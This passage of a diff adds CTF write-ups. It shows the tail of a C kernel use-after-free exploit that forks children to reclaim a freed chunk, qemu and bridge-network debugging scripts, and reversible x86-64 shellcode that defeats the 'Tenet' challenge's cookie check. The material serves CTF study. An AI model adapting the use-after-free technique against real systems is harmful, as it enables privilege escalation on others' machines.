+
+  puts("before release!");
+  release(fd); //Here you could use another munmap. It should work as well.
+
+  //At this point the priv_data of the file descriptor is pointing to a free chunk
+
+  int i = 1;
+  while (1)
+  {
+    int pid = fork();
+    //Spawn several child to get the free chunk allocated
+    if(pid == 0){
+      char * newarg[] = { argv[0], "child", NULL };
+      execv(argv[0], newarg);
+      puts("neve executed!");
+    }
+
+    //checks that the chunk is been written with something else
+    if (get_token(fd) != TOKEN){
+      puts("daje!");
+
+      //Try to run stuff to get a crash!
+      print_info(fd);
+      alloca_size(fd, 0x1000);
+      mappa(fd, 0x1000);
+    }
+  }
+
+  puts("before close");
+  close(fd);
+
+  puts("[parent] Message left.");
+}
+
+int main(int argc, char *argv[]) {
+  if (argc == 1) {
+    parent_work(argc, argv);
+  } else {
+    child_work();
+  }
+  return 0;
+}
+```
+
+### The Setup
+
+I believe a nice setup is one of the most important and useful things to solve a
+CTF challenge. I was a little rusty (a better word for noob) with qemu machines.
+I am putting the setup scripts in this section so that the future me, which will
+still be rusty with qemu machines, can quickly readapt those scripts during
+another CTF. Credits for compilation setup go to mebeim.
+
+#### Run machine recompiling my sourcecode
+
+```bash
+#!/bin/bash
+
+# Uncompress, make changes, recompress
+# mkdir initramfs
+# cd initramfs
+# zcat ../initramfs.cpio.gz | cpio -i -d
+# ... edit stuff
+# find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz
+
+set -e
+
+gcc  -static -g \
+  -o initramfs/home/atoms/expl expl.c
+cp expl.c initramfs/home/atoms/expl.c
+cd initramfs
+find . | cpio -o -H newc | gzip -9 > ../initramfs_edited.cpio.gz
+cd ..
+
+qemu-system-x86_64 \
+  -s \
+  -kernel ./bzImage \
+  -initrd ./initramfs_edited.cpio.gz \
+  -nographic \
+  -cpu qemu64 \
+  -append "console=ttyS0 nokaslr panic=-1 softlockup_panic=1" \
+  -no-reboot \
+  -m 256M -smp cores=2 \
+  -device e1000,netdev=network0 \
+  -netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
+  -monitor none
+```
+
+`-s` is for enableing gdbserver on the kernel.
+
+```
+-device e1000,netdev=network0 \
+-netdev tap,id=network0,ifname=tap0,script=no,downscript=no \
+```
+
+To enable network communication between gest and host. You also need the network
+setup script and assign an IP in the machine. I achieved the IP assignment by
+modifying the init script of the initramfs. `nokaslr` as kernel option to
+disable kaslr. `cat /proc/kallsyms` from inside the vm to get position of
+functions inside the kernel.
+
+#### Setup network for debugging
+
+I needed the network setup from the host and the guest in order to run a
+gdbserver on the executable inside the vm.
+
+```bash
+#!/bin/sh
+
+sudo ip link add br0 type bridge
+sudo ip addr flush dev br0
+# Assign IP to the bridge.
+sudo ip addr add 192.168.100.50/24 brd 192.168.100.255 dev br0
+
+#reate TAP interface.
+sudo ip tuntap add mode tap user $(whoami)
+ip tuntap show
+
+#Add TAP interface to the bridge.
+sudo ip link set tap0 master br0
+
+#Make sure everything is up
+sudo ip link set dev br0 up
+sudo ip link set dev tap0 up
+
+# DELETE
+# sudo ip link set dev br0 down
+# sudo ip link set dev tap0 down
+# sudo ip link del br0
+# sudo ip link del tap0
+```
+
+Inside `./initramfs/init`:
+
+```bash
+ifconfig eth0 up
+ip addr add 192.168.100.51/24 broadcast 192.168.100.255 dev eth0
+```
+
+
+Tenet
+-----
+
+> You have to start looking at the world in a new way.
+>
+> nc 52.192.42.215 9427
+>
+> Author: david942j
+
+### The Goal of the Challenge
+
+The challenge is based on the `server.rb` ruby script which takes a shellcode as
+input and wraps it into an ELF executable file that is then run by the
+`time_machine` debugger. The goal of the challenge was to initially reverse this
+debugger and learn what it exactly does. Later on we found out that in order to
+retrieve the flag the shellcode needed to be executable in two ways: the normal
+and the reversed one. The peculiarity was that the code would run reversed
+following the same flow it got in the 'straight' way.
+
+### The generated ELF
+
+First of all we wanted to test out what kind of wrapping was in place within our
+shellcode, we found out that seccomp was enabled preventing us from executing
+every possible syscall but read, write, exit, and sigreturn, as mentioned in the
+man:
+
+> The only system calls that the calling thread is permitted to make are
+> read(2), write(2), _exit(2) (but not exit_group(2)), and sigreturn(2)
+
+We also found that it initialized a both readable and writable mapping at
+address `0x2170000` to `0x2171000`. Our shellcode started from address
+`0xdead0080` and needed to be less than 2KB.
+
+### The time_machine debugger
+
+We started reversing this binary, we soon realized that it was a debugger
+executing whatever it's passed through as a first argument (Our generated ELF).
+Our shellcode was executed step by step saving in a list every executed
+instruction address. Once it got to a SYSCALL instruction it checked whether the
+EAX register was set to 0x3C (sys_exit) and, if so, it started executing every
+instruction stored in the list in reversed order. The syscall (or sysenter)
+instructions were completely ignored and even if we got one we couldn't execute
+almost anything because of the seccomp. The debugger, once started, also sets an
+8byte cookie to `0x2170000`, checks if it's cleared once our shellcode is
+executed and rechecks if it's there once it got executed the other way back.
+
+### The shellcode
+
+So the challenge was: write down an assembly that could erase the cookie when
+executed in the normal way and could restore it when executed with the same flow
+but reversed. Our first tought was to store it into a register and xor it to
+memory in a way that looked like this:
+
+```
+mov rcx, 0x2170000
+mov rdx, 0x0     ; Clean rdx
+xor rdx, [rcx]   ; Set/erase rdx
+xor [rcx], rdx   ; Erase/set memory
+mov rcx, 0x2170000
+mov eax, 0x3c
+syscall
+```
+
+Of course, it wasn't that simple, the registers (both the CPU and FP ones) got
+erased right before the reversed execution, we needed somewhere else to store
+the cookie. The stack? No, we couldn't have a stack address in the reversed
+execution. The rest of the ```0x2170000``` mapping? No, this debugger checked
+also that the entire page was NULL(ed). But then we realized that we actually
+had a memory: the executed instruction order! So the final shellcode looked like
+this:
+
+```
+mov rdx, 0x2170000 ; initialize rdx to cookie address
+mov rsp, 0x2170500 ; improvised stack to store ret values
+
+mov rcx, rdx
+add rcx, 0
+call confrontoLow ; confronto == compare
+add rcx, 0
+mov rcx, rdx
+add rcx, 0
+call confrontoHigh
+add rcx, 0
+
+mov rcx, rdx
+
+add rcx, 1
+call confrontoLow
+add rcx, 1
+mov rcx, rdx
+add rcx, 1
+call confrontoHigh
+add rcx, 1
+
+mov rcx, rdx
+    .
+    . ; Replicated code for every nibble possible value
+    .
+add rcx, 15 ; While coding at 4am, we didn't realized that up to 7 was enough, we copied more than needed(16 bytes)
+call confrontoLow
+add rcx, 15
+mov rcx, rdx
+add rcx, 15
+call confrontoHigh
+add rcx, 15
+
+
+push 0 ; clean improvised stack
+; reset a bunch of things just to be sure
+mov rsp, 0x2170500
+mov rdx, 0x2170000
+mov rcx, 0x2170500
+xor rdx,rdx
+xor rbx,rbx
+xor rcx,rcx
+xor r14,r14
+; Or should I comment here? Whatever...
+mov rax, 0x3c
+syscall
+
+
+; Check the upper nibble and jump to the calculated function offset
+confrontoHigh:
+xor rbx,rbx
+mov bl, byte ptr[rcx]
+shr bl, 4
+mov r14, 0xdead035b ; absolute for nibble00High
+add r14, rbx        ; multiply by 8 for lazy people
+add r14, rbx
+add r14, rbx
+add r14, rbx
+add r14, rbx
+add r14, rbx
+add r14, rbx
+add r14, rbx
+jmp r14
+
+
+; Check the lower nibble and jump to the calculated function offset
+confrontoLow:
+xor rbx,rbx
+mov bl, byte ptr[rcx]
+and bl, 0xf
+mov r14, 0xdead030b ; absolute for nibble00Low
+add r14, rbx        ; multiply by 5 for lazy people
+add r14, rbx
+add r14, rbx
+add r14, rbx
+add r14, rbx
+jmp r14
+
+
+nibble00Low:
+xor qword ptr [rcx],0x00
+ret
+
+nibble01:
+xor qword ptr [rcx],0x01
+ret
+    .
+    .
+    .
+nibble0f:
+xor qword ptr [rcx],0x0f
+ret
+
+
+nibble00High:
+xor qword ptr [rcx],0x00
+ret
+nop  ; Needed a 3 byte offset because xor with immediate ≤0x7f is smaller than the other half byte (Wtf x64 assembly?)
+nop
+nop
+
+nibble10:
+xor qword ptr [rcx],0x10
+ret
+nop
+nop
+nop
+    .
+    .
+    .
+nibble70:
+xor qword ptr [rcx],0x70
+ret
+nop
+nop
+nop
+
+nibble80:
+xor qword ptr [rcx],0x80
+ret
+    .
+    .
+    .
+nibblef0:
+xor qword ptr [rcx],0xf0
+ret
+```
+
+And the flow does the rest... When it goes back it initializes a register at the
+right byte address and the flow 'remembers' which value every nibble had by
+executing the code segment containing the xor with that value.
+
+### Conclusion
+
+We could, as we had seen from the solution, have used bits instead of nibbles
+but hey! At least we didn't use bytes! Also, during our journey, we thought we
+could use some floating-point register but we had seen that this wasn't the case
+because those got erased too. (Turns out we were wrong because the xmm registers
+did got erased, while the ymm registers didn't get erased)
